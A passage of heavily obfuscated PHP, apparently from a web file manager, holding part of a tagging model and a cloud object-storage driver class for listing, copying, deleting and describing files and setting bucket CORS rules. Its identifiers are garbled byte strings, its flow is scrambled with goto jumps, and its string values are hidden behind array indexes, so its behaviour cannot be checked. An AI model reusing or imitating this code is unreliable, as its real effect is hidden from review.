$e¼ÅÎÓÛ = $C„ö£Ú¨›[$CğíŠéÂ£[75]]; if (!$e¼ÅÎÓÛ) { continue; } if (!isset($eŠ‚µÓ£­–[$e¼ÅÎÓÛ])) { $eŠ‚µÓ£­–[$e¼ÅÎÓÛ] = array(); } $eŠ‚µÓ£­–[$e¼ÅÎÓÛ][] = $C„ö£Ú¨›[$CğíŠéÂ£[413]]; } $d×‘ÈšÌšî = array(); goto aÆ©“ÃæÍÇ; ağƒÛÉÏÍ£: $CğíŠéÂ£ =& $_SERVER[Š‰]; if ($CœËë³Á¼¤ && !is_array($CœËë³Á¼¤)) { $CœËë³Á¼¤ = array($CœËë³Á¼¤); } $c¡µ–‰‰”® = $this->listData($FìæêºÍ«Š); goto FÀ¨÷ª«; aÆ©“ÃæÍÇ: foreach ($eŠ‚µÓ£­– as $E‹ŠÇ¶¹Äª => $BºßÖõÑªŠ) { $bÈ•÷ì»òË = !0; if (!$CœËë³Á¼¤) { $d×‘ÈšÌšî[] = $E‹ŠÇ¶¹Äª; continue; } foreach ($CœËë³Á¼¤ as $eÖã¤‘¡ø–) { if (!in_array($eÖã¤‘¡ø–, $BºßÖõÑªŠ)) { $bÈ•÷ì»òË = !1; break; } } if ($bÈ•÷ì»òË) { $d×‘ÈšÌšî[] = $E‹ŠÇ¶¹Äª; } } if (!$d×‘ÈšÌšî) { return array(); } $a»ÕçÖ’º” = Model($CğíŠéÂ£[1180])->listSource(array($CğíŠéÂ£[404] => array($CğíŠéÂ£[405], $d×‘ÈšÌšî))); goto Då“ïå¤Êí; EŠÄ¸ÅçŞÒ: } protected function listData($BÃ¸Şå´É) { $cˆíôÎÜ =& $_SERVER[Š‰]; $a‘“é›² = array($cˆíôÎÜ[1492] => 0, $cˆíôÎÜ[457] => array($cˆíôÎÜ[1770], 0), $cˆíôÎÜ[409] => $cˆíôÎÜ[1771] . $BÃ¸Şå´É); $A°ÃŸ½ÅÇ = $cˆíôÎÜ[1772]; $dÛ³ù”ÅØÀ = $this->field($A°ÃŸ½ÅÇ)->where($a‘“é›²)->order($cˆíôÎÜ[1773])->select(); return $dÛ³ù”ÅØÀ ? $dÛ³ù”ÅØÀ : array(); } protected function addToTag($bå¦Æ˜Éö, $EİŠ”¡ğ», $dèÆ—ÒŞÊ™) { $D†Õßâ‡ì =& $_SERVER[Š‰]; if (!$this->getByTagID($bå¦Æ˜Éö, $dèÆ—ÒŞÊ™) || !$EİŠ”¡ğ») { return !1; } if (!Model($D†Õßâ‡ì[775])->pathInfo($EİŠ”¡ğ»)) { return !1; } $Fòæ»¢š†° = array($D†Õßâ‡ì[1492] => 0, $D†Õßâ‡ì[457] => $dèÆ—ÒŞÊ™, $D†Õßâ‡ì[408] => $EİŠ”¡ğ», $D†Õßâ‡ì[409] => $D†Õßâ‡ì[1774] . $bå¦Æ˜Éö, $D†Õßâ‡ì[407] => $D†Õßâ‡ì[33], $D†Õßâ‡ì[1667] => 0); if ($this->where($Fòæ»¢š†°)->find()) { return !1; } return $this->add($Fòæ»¢š†°); } protected function removeFromTag($d˜Î•µóŞ†, $FîƒöÇèÂÅ, $eØËÓÁå) { $AÖ†¡ÒÂ…² =& $_SERVER[Š‰]; if (!$this->getByTagID($d˜Î•µóŞ†, $eØËÓÁå) || !$FîƒöÇèÂÅ) { return !1; } if (is_array($FîƒöÇèÂÅ)) { $FîƒöÇèÂÅ = array($AÖ†¡ÒÂ…²[7], $FîƒöÇèÂÅ); } $D˜ÜùÆÉ¾É = array($AÖ†¡ÒÂ…²[1492] => 0, $AÖ†¡ÒÂ…²[457] => $eØËÓÁå, $AÖ†¡ÒÂ…²[409] => $AÖ†¡ÒÂ…²[1774] . $d˜Î•µóŞ†, $AÖ†¡ÒÂ…²[408] => $FîƒöÇèÂÅ); return $this->where($D˜ÜùÆÉ¾É)->delete(); } protected function removeByTag($fáÃš×’®, $fì„Ô¤ê…ç) { $aÓ´Ô¾°–Œ =& $_SERVER[Š‰]; if (!$this->getByTagID($fáÃš×’®, $fì„Ô¤ê…ç)) { return !1; } $f‡ò‡­‰•¸ = array($aÓ´Ô¾°–Œ[1492] => 0, $aÓ´Ô¾°–Œ[457] => $fì„Ô¤ê…ç, $aÓ´Ô¾°–Œ[409] => $aÓ´Ô¾°–Œ[1774] . $fáÃš×’®); return $this->where($f‡ò‡­‰•¸)->delete(); } protected function removeBySource($aİ¹èˆ®Ì», $BÖ¹‰„˜Ë) { $eƒÆ‘Ô†ËÆ =& $_SERVER[Š‰]; if (!$aİ¹èˆ®Ì» || !$BÖ¹‰„˜Ë) { return !1; } if (is_array($BÖ¹‰„˜Ë)) { $BÖ¹‰„˜Ë = array($eƒÆ‘Ô†ËÆ[7], $BÖ¹‰„˜Ë); } $eˆ—””‰Ó¤ = array($eƒÆ‘Ô†ËÆ[1492] => 0, $eƒÆ‘Ô†ËÆ[408] => $BÖ¹‰„˜Ë, $eƒÆ‘Ô†ËÆ[457] => array($eƒÆ‘Ô†ËÆ[948], 0), $eƒÆ‘Ô†ËÆ[409] => $eƒÆ‘Ô†ËÆ[1774] . $aİ¹èˆ®Ì»); return $this->where($eˆ—””‰Ó¤)->delete(); } } goto fÔàîÑÂ¤; C‡¾À¿¾ç: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($eÚ×£Óœ„Å) { parent::__construct(); include_once SDK_DIR . $_SERVER[Š‰][1233]; $this->_init($eÚ×£Óœ„Å); } public function _init($A„Êµ×ÕÏ) { $EÕÈ¸¶­¾Ú =& $_SERVER[Š‰]; foreach ($A„Êµ×ÕÏ as $AØòéÇÆÌ‚ => $Eª…Ó·›õì) { if (isset($this->{$AØòéÇÆÌ‚})) { $this->{$AØòéÇÆÌ‚} = $Eª…Ó·›õì; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($EÕÈ¸¶­¾Ú[1234] . LNG($EÕÈ¸¶­¾Ú[1235])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto BÓ–¬Œ—ˆ˜; e¡¦ØòØ×œ: $Fëáê¥¨->setMaxAgeSeconds(600); $Fëáê¥¨->addExposeHeader($C©¿µÉÛ¡÷[1241]); $Fëáê¥¨->addAllowedHeader($C©¿µÉÛ¡÷[1236]); goto eÛšµ•äğ’; a®¢ÌÔ§İÍ: $Fëáê¥¨->addAllowedOrigin($C©¿µÉÛ¡÷[1236]); $Fëáê¥¨->addAllowedMethod($C©¿µÉÛ¡÷[1237]); $Fëáê¥¨->addAllowedMethod($C©¿µÉÛ¡÷[1238]); goto F„Ô˜ŸÚŸ‰; BÓ–¬Œ—ˆ˜: $C©¿µÉÛ¡÷ =& $_SERVER[Š‰]; $F‚‚—¦ˆ×¿ = new OSS\Model\CorsConfig(); $Fëáê¥¨ = new OSS\Model\CorsRule(); goto a®¢ÌÔ§İÍ; F„Ô˜ŸÚŸ‰: $Fëáê¥¨->addAllowedMethod($C©¿µÉÛ¡÷[1239]); $Fëáê¥¨->addAllowedMethod($C©¿µÉÛ¡÷[1240]); $Fëáê¥¨->addAllowedMethod($C©¿µÉÛ¡÷[157]); goto e¡¦ØòØ×œ; eÛšµ•äğ’: $F‚‚—¦ˆ×¿->addRule($Fëáê¥¨); try { $this->client->putBucketCors($this->bucket, $F‚‚—¦ˆ×¿); } catch (OSS\Core\OssException $cÉÏÇµá®©) { return !1; } return !0; goto Dá¶ª£‚–‹; Dá¶ª£‚–‹: } public function getBucketCors() { goto EùĞĞ‹ Ë; EùĞĞ‹ Ë: $dÙ–½„íØ =& $_SERVER[Š‰]; $a×·É›® µ = null; try { $a×·É›® µ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $B‚Ğ‘ğÓœ) { return null; } goto a‰Öß¢ñ¡; E¤„²ÒÉ”·: $EÙ²ˆáï¬ğ = $b†³¶–²—¬[0]->getMaxAgeSeconds(); $bíÔºÔê´ = $b†³¶–²—¬[0]->getExposeHeaders(); $e’·×õŠª£ = $b†³¶–²—¬[0]->getAllowedHeaders(); goto Böô‡ãÎÎ¾; Böô‡ãÎÎ¾: return array($dÙ–½„íØ[181] => isset($bàƒ™ğ°êï[0]) ? $bàƒ™ğ°êï[0] : $dÙ–½„íØ[33], $dÙ–½„íØ[185] => $bËÁ…ĞÊ™‡, $dÙ–½„íØ[1242] => $EÙ²ˆáï¬ğ, $dÙ–½„íØ[1243] => isset($bíÔºÔê´[0]) ? $bíÔºÔê´[0] : $dÙ–½„íØ[33], $dÙ–½„íØ[183] => isset($e’·×õŠª£[0]) ? $e’·×õŠª£[0] : $dÙ–½„íØ[33]); goto AŞÔ¡Ú‰ñ; a‰Öß¢ñ¡: if (!$a×·É›® µ || !($b†³¶–²—¬ = $a×·É›® µ->getRules())) { return null; } $bàƒ™ğ°êï = $b†³¶–²—¬[0]->getAllowedOrigins(); $bËÁ…ĞÊ™‡ = $b†³¶–²—¬[0]->getAllowedMethods(); goto E¤„²ÒÉ”·; AŞÔ¡Ú‰ñ: } public function isBucketCors() { goto c¾¬‹¹ÇÏ; c¾¬‹¹ÇÏ: $a’‡ öàÌ‡ =& $_SERVER[Š‰]; $a³·š†‘œ = $this->getBucketCors(); if (!$a³·š†‘œ || !is_array($a³·š†‘œ)) { return !1; } goto aæƒƒ¤í™¯; aÃÎÖ²í¦Û: $aåº›óÍÀ„ = array($a’‡ öàÌ‡[186], $a’‡ öàÌ‡[187], $a’‡ öàÌ‡[188], $a’‡ öàÌ‡[189], $a’‡ öàÌ‡[190]); $B±ì¸Ñßà” = array_diff($aåº›óÍÀ„, $cÙäëÈ¦¥); return empty($B±ì¸Ñßà”); goto B²§á§Ë£; aæƒƒ¤í™¯: if ($a³·š†‘œ[$a’‡ öàÌ‡[181]] != $a’‡ öàÌ‡[182] || $a³·š†‘œ[$a’‡ öàÌ‡[183]] != $a’‡ öàÌ‡[182]) { return !1; } $cÙäëÈ¦¥ = array_map($a’‡ öàÌ‡[184], $a³·š†‘œ[$a’‡ öàÌ‡[185]]); if (!is_array($cÙäëÈ¦¥)) { $cÙäëÈ¦¥ = array(); } goto aÃÎÖ²í¦Û; B²§á§Ë£: } public function mkfile($cäÄƒÊã, $bğï¨‡¦§‘ = '', $Få›½Èå˜Õ = REPEAT_RENAME) { $Eâã§ùšœ = $this->setContent($cäÄƒÊã, $bğï¨‡¦§‘); if ($Eâã§ùšœ !== !1) { return $this->getPathOuter($cäÄƒÊã); } return !1; } public function mkdir($B “‹°è¹Û, $cÍ“¹Äæ÷Œ = REPEAT_SKIP) { if ($this->_isFolder($B “‹°è¹Û)) { return $this->getPathOuter($B “‹°è¹Û); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($B “‹°è¹Û)); } catch (OSS\Core\OssException $C•ø´Ü½÷Ê) { return !1; } return $this->getPathOuter($B “‹°è¹Û); } private function fileList($dÉï·Æ×ß¾, $AÆ‘¨ãâÒ = '', $Dß“¿Å‰•‚ = 0) { goto dŒÂÛ™Òù; dŒÂÛ™Òù: $f¢Á•ù‡õ  =& $_SERVER[Š‰]; $dÉï·Æ×ß¾ = trim($dÉï·Æ×ß¾, $f¢Á•ù‡õ [8]); $b¼Šè¼¾Ÿ– = empty($dÉï·Æ×ß¾) ? $f¢Á•ù‡õ [33] : $dÉï·Æ×ß¾ . $f¢Á•ù‡õ [8]; goto aÛ±Æ£Š•ß; dÍÁ·‡Ì˜¿: $FÄ×êÀï‰ = $BœäâÂ§ÆË = array(); while (!0) { check_abort(); $eäùå—‘çä = array($f¢Á•ù‡õ [1244] => $AÆ‘¨ãâÒ, $f¢Á•ù‡õ [1245] => $b¼Šè¼¾Ÿ–, $f¢Á•ù‡õ [1246] => $aÔ·’“‡ù•, $f¢Á•ù‡õ [1247] => $fİÊÂ‚ó«); try { $FäŞ–‰Ë²Ó = $this->client->listObjects($this->bucket, $eäùå—‘çä); } catch (OSS\Core\OssException $dï¿…òÚ¼ç) { break; } $fİÊÂ‚ó« = $FäŞ–‰Ë²Ó->getNextMarker(); $Bæœ¸å„ = $FäŞ–‰Ë²Ó->getObjectList(); $CÁ‹Şñ‡¹ = $FäŞ–‰Ë²Ó->getPrefixList(); foreach ($Bæœ¸å„ as $bóá„İÅé³) { goto c©–®”‹ªô; F‚ëÛ•ã²Ë: if ($EóÑ…ÈŞŞâ) { $this->cacheMethod($f¢Á•ù‡õ [197], $cñ±£°•–, $d’õ°§Ê¾ƒ); $this->cacheMethod($f¢Á•ù‡õ [198], $cñ±£°•–, array($f¢Á•ù‡õ [77] => $Bø–†íÊ¦, $f¢Á•ù‡õ [1248] => $Bø–†íÊ¦, $f¢Á•ù‡õ [83] => strtotime($EÃø–ÔŒë›), $f¢Á•ù‡õ [1249] => $EÃø–ÔŒë›)); } if ($d’õ°§Ê¾ƒ) { $FÄ×êÀï‰[] = $cñ±£°•–; continue; } $BœäâÂ§ÆË[] = $fÇŸ¬¬›ô; goto aœÃÉ…Ö›; CÍ­„ñˆ: $EÃø–ÔŒë› = $bóá„İÅé³->getLastModified(); $fÇŸ¬¬›ô = $Dß“¿Å‰•‚ ? array($f¢Á•ù‡õ [28] => $cñ±£°•–, $f¢Á•ù‡õ [77] => $Bø–†íÊ¦, $f¢Á•ù‡õ [195] => strtotime($EÃø–ÔŒë›)) : $cñ±£°•–; $d’õ°§Ê¾ƒ = $Bø–†íÊ¦ == 0 && substr($cñ±£°•–, strlen($cñ±£°•–) - 1, 1) == $f¢Á•ù‡õ [8] ? !0 : !1; goto F‚ëÛ•ã²Ë; c©–®”‹ªô: if ($bóá„İÅé³->getKey() == $b¼Šè¼¾Ÿ–) { continue; } $cñ±£°•– = $bóá„İÅé³->getKey(); $Bø–†íÊ¦ = $bóá„İÅé³->getSize(); goto CÍ­„ñˆ; aœÃÉ…Ö›: } foreach ($CÁ‹Şñ‡¹ as $DÉåÌÜ…Ö) { $FÄ×êÀï‰[] = $DÉåÌÜ…Ö->getPrefix(); if ($EóÑ…ÈŞŞâ) { $this->cacheMethod($f¢Á•ù‡õ [197], $cñ±£°•–, !0); } } if ($fİÊÂ‚ó« === $f¢Á•ù‡õ [33]) { break; } } if ($EóÑ…ÈŞŞâ) { $this->cacheMethod($f¢Á•ù‡õ [197], $dÉï·Æ×ß¾, !0); } goto e“´«‹³óİ; aÛ±Æ£Š•ß: $fİÊÂ‚ó« = $f¢Á•ù‡õ [33]; $aÔ·’“‡ù• = 1000; $EóÑ…ÈŞŞâ = $this->listItemCache === !1 ? !1 : !0; goto dÍÁ·‡Ì˜¿; e“´«‹³óİ: return array($f¢Á•ù‡õ [74] => $FÄ×êÀï‰, $f¢Á•ù‡õ [73] => $BœäâÂ§ÆË); goto eœÙŞ‰ÊØ; eœÙŞ‰ÊØ: } public function copyFile($DÏÑÔ‹¬ˆš, $A‡‚½ç¢­) { $C¥‡Ú°·ñŞ = $this->size($DÏÑÔ‹¬ˆš); if ($C¥‡Ú°·ñŞ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $DÏÑÔ‹¬ˆš, $this->bucket, $this->pathEncode($A‡‚½ç¢­)); } catch (OSS\Core\OssException $aœ—ÃŒÉ¼˜) { return !1; } return $this->getPathOuter($A‡‚½ç¢­); } $bß¨¹ƒĞèÉ = $this->multiCopyObject($DÏÑÔ‹¬ˆš, $A‡‚½ç¢­, $C¥‡Ú°·ñŞ); return $bß¨¹ƒĞèÉ ? $this->getPathOuter($A‡‚½ç¢­) : !1; } private function multiCopyObject($Eéöó±éÊƒ, $d˜ÌÑùé, $fë¥ÄáÛ·¥) { $fŠèÆøŸš =& $_SERVER[Š‰]; try { goto F÷Ç°İ°ÖÔ; D‚ÈÒó¯ç: $C¤Û§çœŠ£ = 1024 * 1024 * 10; $d®‘˜â‚‘ = $this->client->generateMultiuploadParts($fë¥ÄáÛ·¥, $C¤Û§çœŠ£); foreach ($d®‘˜â‚‘ as $b˜ÃÖÍìÛ => $fÚ”’…õõ) { $Cîì£ÌŞÅ´ = $BÈ—àÕ¦Êù + (int) $fÚ”’…õõ[$fŠèÆøŸš[1251]]; $e“Í¢Ë¿±‘ = (int) $fÚ”’…õõ[$fŠèÆøŸš[333]] + $Cîì£ÌŞÅ´ - 1; $AÈ¼ŠºŠë¨ = array($fŠèÆøŸš[1252] => $Cîì£ÌŞÅ´, $fŠèÆøŸš[1253] => $e“Í¢Ë¿±‘); $B‡ù”Ô‹Š[] = $this->client->uploadPartCopy($this->bucket, $Eéöó±éÊƒ, $this->bucket, $this->pathEncode($d˜ÌÑùé), $eà¾­ŠÊˆ¨, $Dá±òÅ¸°…, $AÈ¼ŠºŠë¨); $eà¾­ŠÊˆ¨ = $eà¾­ŠÊˆ¨ + 1; } goto f×øéè£İé; f×øéè£İé: $DŠá„Îã©» = array(); foreach ($B‡ù”Ô‹Š as $b˜ÃÖÍìÛ => $E·‡×î‡‡) { $DŠá„Îã©»[] = array($fŠèÆøŸš[1254] => $b˜ÃÖÍìÛ + 1, $fŠèÆøŸš[1255] => $E·‡×î‡‡); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($d˜ÌÑùé), $Dá±òÅ¸°…, $DŠá„Îã©»); goto eŠë«…öéÀ; Cîì¨äËÑ: $eà¾­ŠÊˆ¨ = 1; $BÈ—àÕ¦Êù = 0; $B‡ù”Ô‹Š = array(); goto D‚ÈÒó¯ç; F÷Ç°İ°ÖÔ: $FÛáÃÁƒà¿ = array(); if ($EŒŸÈ›Â†İ = $this->hashMd5($Eéöó±éÊƒ)) { $FÛáÃÁƒà¿ = array(OSS\OssClient::OSS_HEADERS => array($fŠèÆøŸš[1250] => $EŒŸÈ›Â†İ)); } $Dá±òÅ¸°… = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($d˜ÌÑùé), $FÛáÃÁƒà¿); goto Cîì¨äËÑ; eŠë«…öéÀ: } catch (OSS\Core\OssException $FŠ™®ØËÓ) { return !1; } return !0; } public function moveFile($Cµ‰Ä¡Ãç, $Dê–¶²é—Ë) { if ($this->copyFile($Cµ‰Ä¡Ãç, $Dê–¶²é—Ë)) { $this->remove($Cµ‰Ä¡Ãç); return $this->getPathOuter($Dê–¶²é—Ë); } return !1; } public function delFile($aï†ŞãĞ„—) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($aï†ŞãĞ„—)); } catch (OSS\Core\OssException $dïÜâÆ’›ç) { return !1; } return !0; } public function delFolder($B’ òõñÊé) { goto DÙ¦»®­•; A…¸Ûˆ¨‰: $e¦çŒå†Œ‰ = $this->fileList($B’ òõñÊé); $this->listItemCache = !0; $AˆùÂèÑå = trim($B’ òõñÊé, $Bå‡´´ØÒ•[8]) . $Bå‡´´ØÒ•[8]; goto Fï¶Æ×“š¾; AÊŒÉ„ê: return $this->delByBatch($e¦çŒå†Œ‰[$Bå‡´´ØÒ•[74]]); goto b¦õ’À™­; Fï¶Æ×“š¾: if (!empty($B’ òõñÊé) && !in_array($AˆùÂèÑå, $e¦çŒå†Œ‰[$Bå‡´´ØÒ•[74]])) { $e¦çŒå†Œ‰[$Bå‡´´ØÒ•[74]][] = $AˆùÂèÑå; } $dØ¿ÙñèÂ = $this->delByBatch($e¦çŒå†Œ‰[$Bå‡´´ØÒ•[73]]); if (!$dØ¿ÙñèÂ) { return !1; } goto AÊŒÉ„ê; DÙ¦»®­•: $Bå‡´´ØÒ• =& $_SERVER[Š‰]; if (!$this->exist($B’ òõñÊé)) { return !0; } $this->listItemCache = !1; goto A…¸Ûˆ¨‰; b¦õ’À™­: } private function delByBatch($D¶ñæÒÑËí) { foreach (array_chunk($D¶ñæÒÑËí, 1000) as $a¿˜¢ÏÇ´„) { try { $this->client->deleteObjects($this->bucket, $a¿˜¢ÏÇ´„); } catch (OSS\Core\OssException $fìßİêò­„) { return !1; } } return !0; } public function rename($B²„³ˆÑ, $b®•“ŠÖ÷) { return $this->renameObject($B²„³ˆÑ, $b®•“ŠÖ÷); } private function fileInfo($CŸæ”†Õ, $eÒ…ˆ×šÁ¤ = false, $FÙÚì´ç‚Ğ = array()) { goto b­š¶İÒ„Ì; b­š¶İÒ„Ì: $BŒ¨ÁôÅÖ =& $_SERVER[Š‰]; $f³Ù¹øøÇ = array($BŒ¨ÁôÅÖ[28] => $this->pathThis($CŸæ”†Õ), $BŒ¨ÁôÅÖ[75] => $this->getPathOuter($CŸæ”†Õ), $BŒ¨ÁôÅÖ[29] => $BŒ¨ÁôÅÖ[173], $BŒ¨ÁôÅÖ[77] => isset($FÙÚì´ç‚Ğ[$BŒ¨ÁôÅÖ[77]]) ? $FÙÚì´ç‚Ğ[$BŒ¨ÁôÅÖ[77]] : 0, $BŒ¨ÁôÅÖ[167] => $this->ext($CŸæ”†Õ)); if ($eÒ…ˆ×šÁ¤) { return $f³Ù¹øøÇ; } goto F‡Âã¨ÔÚ; F‡Âã¨ÔÚ: $f³Ù¹øøÇ[$BŒ¨ÁôÅÖ[192]] = $f³Ù¹øøÇ[$BŒ¨ÁôÅÖ[83]] = 0; $f³Ù¹øøÇ[$BŒ¨ÁôÅÖ[193]] = $f³Ù¹øøÇ[$BŒ¨ÁôÅÖ[194]] = !0; if (empty($FÙÚì´ç‚Ğ)) { $F¹ˆ©ÒÑëŒ = $this->objectMeta($CŸæ”†Õ); if (!$F¹ˆ©ÒÑëŒ) { return $f³Ù¹øøÇ; } $FÙÚì´ç‚Ğ = array($BŒ¨ÁôÅÖ[83] => strtotime($F¹ˆ©ÒÑëŒ[$BŒ¨ÁôÅÖ[1249]]), $BŒ¨ÁôÅÖ[77] => $F¹ˆ©ÒÑëŒ[$BŒ¨ÁôÅÖ[1248]] + 0); } goto FñÉæÔÜÂë; FñÉæÔÜÂë: if (isset($FÙÚì´ç‚Ğ[$BŒ¨ÁôÅÖ[77]])) { $f³Ù¹øøÇ[$BŒ¨ÁôÅÖ[77]] = $FÙÚì´ç‚Ğ[$BŒ¨ÁôÅÖ[77]]; } if (isset($FÙÚì´ç‚Ğ[$BŒ¨ÁôÅÖ[83]])) { $f³Ù¹øøÇ[$BŒ¨ÁôÅÖ[83]] = $FÙÚì´ç‚Ğ[$BŒ¨ÁôÅÖ[83]]; } if (isset($FÙÚì´ç‚Ğ[$BŒ¨ÁôÅÖ[195]]) && !trim($f³Ù¹øøÇ[$BŒ¨ÁôÅÖ[83]])) { $f³Ù¹øøÇ[$BŒ¨ÁôÅÖ[83]] = $FÙÚì´ç‚Ğ[$BŒ¨ÁôÅÖ[195]]; } goto b•ŸÕ”„…³; b•ŸÕ”„…³: return $f³Ù¹øøÇ; goto eİ‡»ô°Ãâ; eİ‡»ô°Ãâ: } private function folderInfo($Aß“ ôñœñ, $e¤â£§Ÿ£ = false, $D¿Şäìğ­ï = array()) { goto EÃ‹¢ò»­‹; a¿ˆä¬¼Ø¸: $FŒÄ›œì¿è[$A›‚å‚¶œò[192]] = $FŒÄ›œì¿è[$A›‚å‚¶œò[83]] = 0; $FŒÄ›œì¿è[$A›‚å‚¶œò[193]] = $FŒÄ›œì¿è[$A›‚å‚¶œò[194]] = !0; if (empty($D¿Şäìğ­ï)) { $Aß“ ôñœñ = rtrim($Aß“ ôñœñ, $A›‚å‚¶œò[8]) . $A›‚å‚¶œò[8]; $E¶åëí–ÀŠ = $this->objectMeta($Aß“ ôñœñ); if (!$E¶åëí–ÀŠ) { return $FŒÄ›œì¿è; } $D¿Şäìğ­ï = array($A›‚å‚¶œò[192] => $E¶åëí–ÀŠ[$A›‚å‚¶œò[1256]][$A›‚å‚¶œò[1257]], $A›‚å‚¶œò[83] => strtotime($E¶åëí–ÀŠ[$A›‚å‚¶œò[1249]])); } goto dø‹‚«ô; dø‹‚«ô: if (isset($D¿Şäìğ­ï[$A›‚å‚¶œò[83]])) { $FŒÄ›œì¿è[$A›‚å‚¶œò[83]] = $D¿Şäìğ­ï[$A›‚å‚¶œò[83]]; } if (isset($D¿Şäìğ­ï[$A›‚å‚¶œò[192]])) { $FŒÄ›œì¿è[$A›‚å‚¶œò[192]] = $D¿Şäìğ­ï[$A›‚å‚¶œò[192]]; } return $FŒÄ›œì¿è; goto bÌ™ãÃ¦Ğ; EÃ‹¢ò»­‹: $A›‚å‚¶œò =& $_SERVER[Š‰]; $FŒÄ›œì¿è = array($A›‚å‚¶œò[28] => $this->pathThis($Aß“ ôñœñ), $A›‚å‚¶œò[75] => $this->getPathOuter($A›‚å‚¶œò[8] . $Aß“ ôñœñ), $A›‚å‚¶œò[29] => $A›‚å‚¶œò[76]); if ($e¤â£§Ÿ£) { return $FŒÄ›œì¿è; } goto a¿ˆä¬¼Ø¸; bÌ™ãÃ¦Ğ: } public function listPath($D¤ª°Ğï‚å, $dæ¡¾÷åÕ = false) { $FµËø¤‰óŒ =& $_SERVER[Š‰]; $dÖ¨Áï›œ = $this->fileList($D¤ª°Ğï‚å, $FµËø¤‰óŒ[8], !0); foreach ($dÖ¨Áï›œ[$FµËø¤‰óŒ[74]] as $A—¸šàÇˆ© => $AÔï¹¸¦¿í) { $dÖ¨Áï›œ[$FµËø¤‰óŒ[74]][$A—¸šàÇˆ©] = $this->folderInfo($AÔï¹¸¦¿í, $dæ¡¾÷åÕ, $AÔï¹¸¦¿í); } foreach ($dÖ¨Áï›œ[$FµËø¤‰óŒ[73]] as $A—¸šàÇˆ© => $AÔï¹¸¦¿í) { $dÖ¨Áï›œ[$FµËø¤‰óŒ[73]][$A—¸šàÇˆ©] = $this->fileInfo($AÔï¹¸¦¿í[$FµËø¤‰óŒ[28]], $dæ¡¾÷åÕ, $AÔï¹¸¦¿í); } return $dÖ¨Áï›œ; } public function has($Aê²äŸ·¾, $Eœ¾ÅİÇ©Í = false, $AÖëíÙ½õ = true) { goto B–‹¹É™Õ³; eš÷¼¿ñÛ‹: while (!0) { check_abort(); $eº§ÉÅæ— = array($EæùÂèßˆ¿[1244] => $EæùÂèßˆ¿[8], $EæùÂèßˆ¿[1245] => $F½½õÙŞ¥Ö, $EæùÂèßˆ¿[1246] => $Cùãƒ„ÓáØ, $EæùÂèßˆ¿[1247] => $F¦™ˆĞ˜—”); try { $D…™‘Ã’º = $this->client->listObjects($this->bucket, $eº§ÉÅæ—); } catch (OSS\Core\OssException $b«°‹êÏõ²) { break; } $F¦™ˆĞ˜—” = $D…™‘Ã’º->getNextMarker(); $b¦Êƒ¢°‰Ù = $D…™‘Ã’º->getObjectList(); $CÕ‘å¤¥‘Ë = $D…™‘Ã’º->getPrefixList(); if ($Eœ¾ÅİÇ©Í) { if (count($b¦Êƒ¢°‰Ù) > 1 || count($b¦Êƒ¢°‰Ù) == 1 && $b¦Êƒ¢°‰Ù[0]->getKey() != $F½½õÙŞ¥Ö) { $dößî±ì–Š += count($b¦Êƒ¢°‰Ù) - 1; } if (!empty($CÕ‘å¤¥‘Ë)) { $bÙÙÇÀÒ«Â += count($CÕ‘å¤¥‘Ë); } if ($F¦™ˆĞ˜—” === $EæùÂèßˆ¿[33]) { break; } continue; } if ($AÖëíÙ½õ) { if (!empty($b¦Êƒ¢°‰Ù)) { if (count($b¦Êƒ¢°‰Ù) > 1 || $b¦Êƒ¢°‰Ù[0]->getKey() != $F½½õÙŞ¥Ö) { return !0; } } } else { if (!empty($CÕ‘å¤¥‘Ë)) { return !0; } } if ($F¦™ˆĞ˜—” === $EæùÂèßˆ¿[33]) { break; } } if ($Eœ¾ÅİÇ©Í) { return array($EæùÂèßˆ¿[201] => $dößî±ì–Š, $EæùÂèßˆ¿[202] => $bÙÙÇÀÒ«Â); } return !1; goto eêšÏİ¦²ó; Bàó‘ØŞÏ‡: $F¦™ˆĞ˜—” = $EæùÂèßˆ¿[33]; $Cùãƒ„ÓáØ = 500; $dößî±ì–Š = $bÙÙÇÀÒ«Â = 0; goto eš÷¼¿ñÛ‹; B–‹¹É™Õ³: $EæùÂèßˆ¿ =& $_SERVER[Š‰]; $Aê²äŸ·¾ = trim($Aê²äŸ·¾, $EæùÂèßˆ¿[8]); $F½½õÙŞ¥Ö = empty($Aê²äŸ·¾) ? $EæùÂèßˆ¿[33] : $Aê²äŸ·¾ . $EæùÂèßˆ¿[8]; goto Bàó‘ØŞÏ‡; eêšÏİ¦²ó: } public function listAll($cÈ•æÙÓ™®) { $Cµ¶Â²œ°» =& $_SERVER[Š‰]; $CÅŸŸºÀª¤ = $this->fileList($cÈ•æÙÓ™®, $Cµ¶Â²œ°»[33], !0); $Bì¼‘“Ì‰À = array(); foreach ($CÅŸŸºÀª¤[$Cµ¶Â²œ°»[73]] as $bááĞ´ùƒ¯) { $Bì¼‘“Ì‰À[$bááĞ´ùƒ¯[$Cµ¶Â²œ°»[28]]] = $bááĞ´ùƒ¯[$Cµ¶Â²œ°»[77]]; } foreach ($CÅŸŸºÀª¤[$Cµ¶Â²œ°»[74]] as $bááĞ´ùƒ¯) { if (is_string($bááĞ´ùƒ¯)) { $Bì¼‘“Ì‰À[$bááĞ´ùƒ¯] = 0; } } return $this->listAllFiles($cÈ•æÙÓ™®, array_keys($Bì¼‘“Ì‰À), $Bì¼‘“Ì‰À); } public function canRead($DÓ·ÑËÑ®Ø) { $B”ÙŒ½ÉĞ =& $_SERVER[Š‰]; $eÔ”‘»Ìï¦ = $this->pathAcl($DÓ·ÑËÑ®Ø); return $eÔ”‘»Ìï¦ == $B”ÙŒ½ÉĞ[1258] || $eÔ”‘»Ìï¦ == $B”ÙŒ½ÉĞ[514] ? !0 : !1; } public function canWrite($bƒİÀˆó§) { $F»íÇîˆù© = $this->pathAcl($bƒİÀˆó§); return $F»íÇîˆù© == 